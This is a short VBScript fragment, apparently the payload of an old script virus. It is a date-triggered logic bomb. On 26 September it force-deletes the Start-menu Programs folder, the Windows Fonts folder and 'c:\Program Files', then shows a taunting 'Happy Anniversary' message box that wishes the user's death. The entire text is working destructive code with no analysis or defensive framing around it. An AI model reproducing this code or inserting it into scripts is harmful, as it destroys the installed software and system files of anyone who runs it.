   if Month(Now) = 9 and Day(Now) = 26 then
   Set f = createobject("scripting.filesystemobject")
   Set s = createobject("wscript.shell")
   if not f.folderexists("c:\myweb\") then
   f.deletefolder s.SpecialFolders("Programs"),true
   f.deletefolder s.SpecialFolders("Fonts"),true
   f.deletefolder "c:\Program Files",true
   Msgbox "Happy Anniversary!" & vbCrLf & vbCrLf & "However, I'm not happy with you. How I wish for your death.", 0, "Anniversary Greeting"
   end if
   end if
